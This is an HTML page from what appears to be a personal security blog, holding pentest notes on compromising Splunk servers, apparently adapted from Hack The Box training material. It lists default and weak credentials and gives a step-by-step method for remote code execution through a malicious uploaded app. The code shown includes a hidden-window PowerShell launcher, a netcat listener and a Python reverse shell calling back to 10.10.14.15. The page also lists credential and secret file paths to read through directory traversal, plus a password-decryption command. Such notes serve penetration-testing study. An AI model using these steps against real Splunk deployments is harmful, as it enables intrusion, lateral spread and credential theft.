@@ -1,0 +1,263 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+	<div class="row page">
+		<!-- cols -->
+		
+					<div class="col-md-12">
+						
+
+							<!-- content -->
+							<div class="mypage">
+								
+
+										<p>default credentials: <code>admin</code>: <code>changeme</code></p>
+<h2 id="Splunk"><a href="#Splunk" class="headerlink" title="Splunk"></a>Splunk</h2><ul>
+<li><input disabled="" type="checkbox"> default creds checked</li>
+<li><input disabled="" type="checkbox"> version enumerated<br>register via expired license</li>
+<li><input disabled="" type="checkbox"> upload vuln plugin &#x2F;RCE</li>
+</ul>
+<p>admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.</p>
+<p>Let’s imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let’s focus our attention on Splunk and see if we can turn this access into RCE.</p>
+<p>The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as <code>admin</code>, <code>changeme</code>, <code>Welcome</code>, <code>Welcome1</code>, <code>Password123</code>, etc.</p>
+<p>Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.<br><img src="https://academy.hackthebox.com/storage/modules/113/splunk_home.png"></p>
+<p>Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input.</p>
+<p>As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We’ll cover this in the next section.<br>Aside from this built-in functionality, </p>
+<h1 id="RCE-using-Splunk"><a href="#RCE-using-Splunk" class="headerlink" title="RCE using Splunk"></a>RCE using Splunk</h1><p>We can use <a target="_blank" rel="noopener" href="https://github.com/0xjpuff/reverse_shell_splunk">this</a> Splunk package to assist us. The <code>bin</code> directory in this repo has examples for <a target="_blank" rel="noopener" href="https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py">Python</a> and <a target="_blank" rel="noopener" href="https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1">PowerShell</a>. Let’s walk through this step-by-step.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/0xjpuff/reverse_shell_splunk.git</span><br><span class="line">$ tree splunk_shell/</span><br><span class="line"></span><br><span class="line">splunk_shell/</span><br><span class="line">├── bin</span><br><span class="line">└── default</span><br><span class="line"></span><br><span class="line">2 directories, 0 files</span><br></pre></td></tr></table></figure>
+
+<p>scripts are in bin, input.conf configures splunk interactions with the app<br>such as enable, interval.</p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.</p>
+<p><code>run.bat</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">PowerShell.exe -exec bypass -w hidden -Command &quot;&amp; &#x27;%~dpn0.ps1&#x27;&quot;</span><br><span class="line">Exit</span><br></pre></td></tr></table></figure>
+
+<p>Once the files are created, we can create a tarball or <code>.spl</code> file.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvzf updater.tar.gz splunk_shell/</span><br><span class="line"></span><br><span class="line">splunk_shell/</span><br><span class="line">splunk_shell/bin/</span><br><span class="line">splunk_shell/bin/rev.py</span><br><span class="line">splunk_shell/bin/run.bat</span><br><span class="line">splunk_shell/bin/run.ps1</span><br><span class="line">splunk_shell/default/</span><br><span class="line">splunk_shell/default/inputs.conf</span><br></pre></td></tr></table></figure>
+
+<p>Before uploading the malicious custom app, let’s start a listener</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo nc -lnvp 443</span><br><span class="line"></span><br><span class="line">listening on [any] 443 ...</span><br></pre></td></tr></table></figure>
+
+<p>install app at :<code>https://IP/en-US/manager/search/apps/local</code></p>
+<p>If we were dealing with a Linux host, we would need to edit the <code>rev.py</code> Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,socket,os,pty</span><br><span class="line"></span><br><span class="line">ip=<span class="string">&quot;10.10.14.15&quot;</span></span><br><span class="line">port=<span class="string">&quot;443&quot;</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((ip,<span class="built_in">int</span>(port)))</span><br><span class="line">[os.dup2(s.fileno(),fd) <span class="keyword">for</span> fd <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)]</span><br><span class="line">pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>If the compromised Splunk host is a deployment server</p>
+<p>If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the <code>$SPLUNK_HOME/etc/deployment-apps</code> directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.</p>
+<h2 id="splunk-directory-traversal"><a href="#splunk-directory-traversal" class="headerlink" title="splunk directory traversal"></a>splunk directory traversal</h2><h3 id="splunk-auth-config-file-paths-to-grab-password-hash"><a href="#splunk-auth-config-file-paths-to-grab-password-hash" class="headerlink" title="splunk auth config file paths ( to grab password hash):"></a>splunk auth config file paths ( to grab password hash):</h3><ul>
+<li><code>/etc/system/local/authentication.conf</code></li>
+<li><code>/etc/system/default/authentication.conf</code></li>
+</ul>
+<h3 id="splunk-secrets"><a href="#splunk-secrets" class="headerlink" title="splunk secrets"></a>splunk secrets</h3><ul>
+<li><code>etc/auth/splunk.secret</code></li>
+</ul>
+<p>decrypt splunk password using splunksecrets</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spls splunk-decrypt  -S splunk.secret  --ciphertext `&lt;hash&gt;`</span><br></pre></td></tr></table></figure>
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
